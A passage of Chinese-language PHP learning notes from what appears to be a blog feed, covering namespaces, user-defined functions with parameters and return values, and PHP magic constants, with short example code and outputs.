<p>语法<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span>  </span></span><br><span class="line"><span class="php"><span class="comment">// 定义代码在 'MyProject' 命名空间中  </span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">MyProject</span>;  </span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php"><span class="comment">// ... 代码 ...</span></span></span><br></pre></td></tr></table></figure></p>
<p>你也可以在同一个文件中定义不同的命名空间代码<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span>  </span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">MyProject</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">const</span> CONNECT_OK = <span class="number">1</span>;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Connection</span> </span>&#123; <span class="comment">/* ... */</span> &#125;</span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">connect</span><span class="params">()</span> </span>&#123; <span class="comment">/* ... */</span>  &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">AnotherProject</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">const</span> CONNECT_OK = <span class="number">1</span>;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Connection</span> </span>&#123; <span class="comment">/* ... */</span> &#125;</span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">connect</span><span class="params">()</span> </span>&#123; <span class="comment">/* ... */</span>  &#125;</span></span><br></pre></td></tr></table></figure></p>
<p>这种写法一般是不建议的，所以为了提高代码的可读性，使用大括号的形式</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">MyProject</span> &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">const</span> CONNECT_OK = <span class="number">1</span>;</span></span><br><span class="line"><span class="php">    <span class="class"><span class="keyword">class</span> <span class="title">Connection</span> </span>&#123; <span class="comment">/* ... */</span> &#125;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">connect</span><span class="params">()</span> </span>&#123; <span class="comment">/* ... */</span>  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">AnotherProject</span> &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">const</span> CONNECT_OK = <span class="number">1</span>;</span></span><br><span class="line"><span class="php">    <span class="class"><span class="keyword">class</span> <span class="title">Connection</span> </span>&#123; <span class="comment">/* ... */</span> &#125;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">connect</span><span class="params">()</span> </span>&#123; <span class="comment">/* ... */</span>  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<p>将全局的非命名空间中的代码与命名空间中的代码组合在一起，只能使用大括号形式的语法。且全局代码必须用一个不带名称的namespace语句加上大括号括起来</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">MyProject</span> &#123;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">const</span> CONNECT_OK = <span class="number">1</span>;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Connection</span> </span>&#123; <span class="comment">/* ... */</span> &#125;</span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">connect</span><span class="params">()</span> </span>&#123; <span class="comment">/* ... */</span>  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> &#123; // 全局代码</span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"><span class="php">$a = MyProject\connect();</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> MyProject\Connection::start();</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<p>在声明命名空间之前唯一合法的代码是用于定义源文件编码方式的declare语句。所有非PHP代码包括空白符都不能出现在命名空间的声明之前<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">declare</span>(encoding=<span class="string">'UTF-8'</span>); <span class="comment">//定义多个命名空间和不包含在命名空间中的代码</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">MyProject</span> &#123;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">const</span> CONNECT_OK = <span class="number">1</span>;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Connection</span> </span>&#123; <span class="comment">/* ... */</span> &#125;</span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">connect</span><span class="params">()</span> </span>&#123; <span class="comment">/* ... */</span>  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> &#123; // 全局代码</span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"><span class="php">$a = MyProject\connect();</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> MyProject\Connection::start();</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure></p>
<p>如果写成这样就会出现语法错误</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">namespace</span> <span class="title">MyProject</span>; <span class="comment">// 命名空间前出现了“&lt;html&gt;” 会致命错误 -　命名空间必须是程序脚本的第一条语句</span></span></span><br></pre></td></tr></table></figure>
<h2 id="子命名空间"><a href="#子命名空间" class="headerlink" title="子命名空间"></a>子命名空间</h2><p>与目录和文件的关系很像，PHP命名空间也允许指定层次化的命名空间的名称。因此，命名空间的名字可以使用分层次的方式定义</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">MyProject</span>\<span class="title">Sub</span>\<span class="title">Level</span>;  <span class="comment">//声明分层次的单个命名空间</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">const</span> CONNECT_OK = <span class="number">1</span>;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Connection</span> </span>&#123; <span class="comment">/* ... */</span> &#125;</span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">Connect</span><span class="params">()</span> </span>&#123; <span class="comment">/* ... */</span>  &#125;</span></span><br></pre></td></tr></table></figure>
<p>类似于目录结构</p>
<h2 id="命名空间使用"><a href="#命名空间使用" class="headerlink" title="命名空间使用"></a>命名空间使用</h2><p>PHP命名空间中的类名可以通过三种方式引用</p>
<ul>
<li><p>非限定名称，或不包含前缀的类名称，例如$a=new foo();或foo::staticmethod();</p>
</li>
<li><p>限定名称，或包含前缀的名称，例如$a=new subnamespace\foo();或subnamespace\foo::staticmethod();</p>
</li>
<li><p>完全限定名称，或包含了全局前缀操作符的名称，例如,$a=new\currentnamespace\foo();</p>
</li>
</ul>
<p>下面便是三种方式的实例<br>file1.php<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">Foo</span>\<span class="title">Bar</span>\<span class="title">subnamespace</span>; </span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">const</span> FOO = <span class="number">1</span>;</span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">foo</span><span class="params">()</span> </span>&#123;&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">foo</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">staticmethod</span><span class="params">()</span> </span>&#123;&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure></p>
<p>file2.php<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">Foo</span>\<span class="title">Bar</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">'file1.php'</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">const</span> FOO = <span class="number">2</span>;</span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">foo</span><span class="params">()</span> </span>&#123;&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">foo</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">staticmethod</span><span class="params">()</span> </span>&#123;&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">/* 非限定名称 */</span></span></span><br><span class="line"><span class="php">foo(); <span class="comment">// 解析为函数 Foo\Bar\foo</span></span></span><br><span class="line"><span class="php">foo::staticmethod(); <span class="comment">// 解析为类 Foo\Bar\foo ，方法为 staticmethod</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> FOO; <span class="comment">// 解析为常量 Foo\Bar\FOO</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">/* 限定名称 */</span></span></span><br><span class="line"><span class="php">subnamespace\foo(); <span class="comment">// 解析为函数 Foo\Bar\subnamespace\foo</span></span></span><br><span class="line"><span class="php">subnamespace\foo::staticmethod(); <span class="comment">// 解析为类 Foo\Bar\subnamespace\foo,</span></span></span><br><span class="line"><span class="php">                                  <span class="comment">// 以及类的方法 staticmethod</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> subnamespace\FOO; <span class="comment">// 解析为常量 Foo\Bar\subnamespace\FOO</span></span></span><br><span class="line"><span class="php">                                  </span></span><br><span class="line"><span class="php"><span class="comment">/* 完全限定名称 */</span></span></span><br><span class="line"><span class="php">\Foo\Bar\foo(); <span class="comment">// 解析为函数 Foo\Bar\foo</span></span></span><br><span class="line"><span class="php">\Foo\Bar\foo::staticmethod(); <span class="comment">// 解析为类 Foo\Bar\foo, 以及类的方法 staticmethod</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> \Foo\Bar\FOO; <span class="comment">// 解析为常量 Foo\Bar\FOO</span></span></span><br></pre></td></tr></table></figure><br>注意访问任意全局类，函数或常量，都可以使用完全限定名称</p>
<p>在命名空间内部访问全局类，函数和常量<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">Foo</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">strlen</span><span class="params">()</span> </span>&#123;&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">const</span> INI_ALL = <span class="number">3</span>;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Exception</span> </span>&#123;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$a = \strlen(<span class="string">'hi'</span>); <span class="comment">// 调用全局函数strlen</span></span></span><br><span class="line"><span class="php">$b = \INI_ALL; <span class="comment">// 访问全局常量 INI_ALL</span></span></span><br><span class="line"><span class="php">$c = <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'error'</span>); <span class="comment">// 实例化全局类 Exception</span></span></span><br></pre></td></tr></table></figure></p>
<h2 id="命名空间和动态语言特征"><a href="#命名空间和动态语言特征" class="headerlink" title="命名空间和动态语言特征"></a>命名空间和动态语言特征</h2><p>PHP命名空间的实现受到其语言自身的动态特征影响。因此，如果要将下面的代码转换到命名空间中，动态访问元素</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">classname</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span>,<span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">funcname</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="keyword">__FUNCTION__</span>,<span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">const</span> constname = <span class="string">"global"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$a = <span class="string">'classname'</span>;</span></span><br><span class="line"><span class="php">$obj = <span class="keyword">new</span> $a; <span class="comment">// prints classname::__construct</span></span></span><br><span class="line"><span class="php">$b = <span class="string">'funcname'</span>;</span></span><br><span class="line"><span class="php">$b(); <span class="comment">// prints funcname</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> constant(<span class="string">'constname'</span>), <span class="string">"\n"</span>; <span class="comment">// prints global</span></span></span><br></pre></td></tr></table></figure>
<p>必须使用完全限定名称（包括命名空间前缀的类名称）。注意因为在动态的类名称、函数名称或常量名称中，限定名称和完全限定名称没有区别，因此其前导的反斜杠是不必要的</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">namespacename</span>;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">classname</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span>,<span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">funcname</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="keyword">__FUNCTION__</span>,<span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">const</span> constname = <span class="string">"namespaced"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">'example1.php'</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$a = <span class="string">'classname'</span>;</span></span><br><span class="line"><span class="php">$obj = <span class="keyword">new</span> $a; <span class="comment">// 输出 classname::__construct</span></span></span><br><span class="line"><span class="php">$b = <span class="string">'funcname'</span>;</span></span><br><span class="line"><span class="php">$b(); <span class="comment">// 输出函数名</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> constant(<span class="string">'constname'</span>), <span class="string">"\n"</span>; <span class="comment">// 输出 global</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">/* 如果使用双引号，使用方法为 "\\namespacename\\classname"*/</span></span></span><br><span class="line"><span class="php">$a = <span class="string">'\namespacename\classname'</span>;</span></span><br><span class="line"><span class="php">$obj = <span class="keyword">new</span> $a; <span class="comment">// 输出 namespacename\classname::__construct</span></span></span><br><span class="line"><span class="php">$a = <span class="string">'namespacename\classname'</span>;</span></span><br><span class="line"><span class="php">$obj = <span class="keyword">new</span> $a; <span class="comment">// 输出 namespacename\classname::__construct</span></span></span><br><span class="line"><span class="php">$b = <span class="string">'namespacename\funcname'</span>;</span></span><br><span class="line"><span class="php">$b(); <span class="comment">// 输出 namespacename\funcname</span></span></span><br><span class="line"><span class="php">$b = <span class="string">'\namespacename\funcname'</span>;</span></span><br><span class="line"><span class="php">$b(); <span class="comment">// 输出 namespacename\funcname</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> constant(<span class="string">'\namespacename\constname'</span>), <span class="string">"\n"</span>; <span class="comment">// 输出 namespaced</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> constant(<span class="string">'namespacename\constname'</span>), <span class="string">"\n"</span>; <span class="comment">// 输出 namespaced</span></span></span><br></pre></td></tr></table></figure>
<h2 id="namespace关键字和-NAMESPACE-常量"><a href="#namespace关键字和-NAMESPACE-常量" class="headerlink" title="namespace关键字和_NAMESPACE_常量"></a>namespace关键字和_NAMESPACE_常量</h2><p>PHP支持两种抽象的访问当前命名空间内部元素的方法，<strong>NAMESPACE</strong> 魔术常量和namespace关键字。</p>
<p>常量<strong>NAMESPACE</strong>的值是包含当前命名空间名称的字符串。在全局的，不包括在任何命名空间中的代码，它包含一个空的字符串。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">MyProject</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'"'</span>, <span class="keyword">__NAMESPACE__</span>, <span class="string">'"'</span>; <span class="comment">// 输出 "MyProject"</span></span></span><br></pre></td></tr></table></figure>
<p>使用_NAMESPACE_动态创建名称<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">MyProject</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($classname)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $a = <span class="keyword">__NAMESPACE__</span> . <span class="string">'\\'</span> . $classname;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> <span class="keyword">new</span> $a;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="全局空间"><a href="#全局空间" class="headerlink" title="全局空间"></a>全局空间</h2><p>如果没有定义任何命名空间，所有的类与函数的定义都是在全局空间，与 PHP 引入命名空间概念前一样。在名称前加上前缀 \ 表示该名称是全局空间中的名称，即使该名称位于其它的命名空间中时也是如此。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">A</span>\<span class="title">B</span>\<span class="title">C</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">/* 这个函数是 A\B\C\fopen */</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">fopen</span><span class="params">()</span> </span>&#123; </span></span><br><span class="line"><span class="php">     <span class="comment">/* ... */</span></span></span><br><span class="line"><span class="php">     $f = \fopen(...); <span class="comment">// 调用全局的fopen函数</span></span></span><br><span class="line"><span class="php">     <span class="keyword">return</span> $f;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.命名空间的存在增加了代码的灵活度，可以更好的编写程序</p>
<p>2.命名空间的使用基本与文件目录相似，都是使用<code>\</code>来进行划分，如果只有一个<code>\</code>那就默认为是全局空间，不加也可以</p>
<p>3.完全命名空间可以看成是完整的绝对路径，而不完全的基本上可以看成是相对路径</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>PHP开发</category>
        <category>基础</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-2020/7/8-基础6</title>
    <url>/2020/07/08/PHP-2020-7-8-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="创建PHP函数"><a href="#创建PHP函数" class="headerlink" title="创建PHP函数"></a>创建PHP函数</h2><p>函数是通过调用函数来执行的</p>
<p>语法<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">functionName</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="comment">// 要执行的代码</span></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>PHP函数准则：</p>
<ul>
<li>函数的名称应该提示出它的功能</li>
<li>函数名称以字母或下划线开头，不能以数字开头</li>
</ul>
<p>例如<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">writeName</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"Kai Jim Refsnes"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"My name is "</span>;</span></span><br><span class="line"><span class="php">writeName();</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">My <span class="built_in">name</span> <span class="keyword">is</span> Kai Jim Refsnes</span><br></pre></td></tr></table></figure></p>
<h2 id="添加参数"><a href="#添加参数" class="headerlink" title="添加参数"></a>添加参数</h2><p>为了给函数添加更多的功能，我们可以添加参数，参数类似于变量<br>参数就在函数名称后面的一个括号内指定</p>
<p>例如<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">writeName</span><span class="params">($fname)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $fname . <span class="string">" Refsnes.\n"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"My name is "</span>;</span></span><br><span class="line"><span class="php">writeName(<span class="string">"Kai Jim"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"My sister's name is "</span>;</span></span><br><span class="line"><span class="php">writeName(<span class="string">"Hege"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"My brother's name is "</span>;</span></span><br><span class="line"><span class="php">writeName(<span class="string">"Stale"</span>);</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">My name <span class="keyword">is</span> Kai Jim Refsnes.</span><br><span class="line">My siste<span class="string">r's name is Hege Refsnes.</span></span><br><span class="line"><span class="string">My brother'</span>s name <span class="keyword">is</span> Stale Refsnes.</span><br></pre></td></tr></table></figure></p>
<p>还可以为两个参数<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">writeName</span><span class="params">($fname,$punctuation)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $fname . <span class="string">" Refsnes"</span> . $punctuation . <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"My name is "</span>;</span></span><br><span class="line"><span class="php">writeName(<span class="string">"Kai Jim"</span>,<span class="string">"."</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"My sister's name is "</span>;</span></span><br><span class="line"><span class="php">writeName(<span class="string">"Hege"</span>,<span class="string">"!"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"My brother's name is "</span>;</span></span><br><span class="line"><span class="php">writeName(<span class="string">"Ståle"</span>,<span class="string">"?"</span>);</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">My name is Kai Jim Refsnes.</span><br><span class="line">My siste<span class="string">r's name is Hege Refsnes!</span></span><br><span class="line"><span class="string">My brother'</span>s name is Ståle Refsnes?</span><br></pre></td></tr></table></figure></p>
<h2 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h2><p>使用return语句</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">($x,$y)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $total=$x+$y;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> $total;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"1 + 16 = "</span> . add(<span class="number">1</span>,<span class="number">16</span>);</span></span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">1 </span>+ <span class="number">16</span> = <span class="number">17</span></span><br></pre></td></tr></table></figure></p>
<h1 id="魔术常量"><a href="#魔术常量" class="headerlink" title="魔术常量"></a>魔术常量</h1><p>PHP向它运行的任何脚本提供了大量的预定义常量</p>
<p>还可以通过加载拓展库来实现更多常量</p>
<p>有八个魔术常量它们的值随着它们在代码中的位置改变而改变</p>
<h2 id="LINE"><a href="#LINE" class="headerlink" title="_LINE_"></a>_LINE_</h2><p>文件中的当前行号<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'这是第 " '</span>  . <span class="keyword">__LINE__</span> . <span class="string">' " 行'</span>;</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">这是第 <span class="string">" 2 "</span> 行</span><br></pre></td></tr></table></figure></p>
<h2 id="FILE"><a href="#FILE" class="headerlink" title="_FILE_"></a>_FILE_</h2><p>文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名</p>
<p>从PHP4.0.2后，总是包含一个绝对路径</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'该文件位于 " '</span>  . <span class="keyword">__FILE__</span> . <span class="string">' " '</span>;</span></span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">该文件位于 " F:<span class="symbol">\d</span>efault<span class="symbol">\P</span>HP_default<span class="symbol">\t</span>est1.php "</span><br></pre></td></tr></table></figure></p>
<h2 id="DIR"><a href="#DIR" class="headerlink" title="_DIR_"></a>_DIR_</h2><p>返回文件所在的目录。如果用在被包括文件中，则返回被包含的文件所在的目录</p>
<p>等价于dirname(_FILE_)。除非是根目录，否则目录名不包括末尾的斜杠</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'该文件位于 " '</span>  . <span class="keyword">__DIR__</span> . <span class="string">' " '</span>;</span></span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">该文件位于 " F:<span class="symbol">\d</span>efault<span class="symbol">\P</span>HP_default "</span><br></pre></td></tr></table></figure></p>
<h2 id="FUNCTION"><a href="#FUNCTION" class="headerlink" title="_FUNCTION_"></a>_FUNCTION_</h2><p>返回函数所在的函数名称。自PHP5起本常量返回该函数被定义时的名字(区分大小写)</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span>  <span class="string">'函数名为：'</span> . <span class="keyword">__FUNCTION__</span> ;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">test();</span></span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">函数名为：<span class="built_in">test</span></span><br></pre></td></tr></table></figure></p>
<h2 id="CLASS"><a href="#CLASS" class="headerlink" title="_CLASS_"></a>_CLASS_</h2><p>返回所在类的名称。自PHP5起本常量返回该类被定义时的名字(区分大小写)</p>
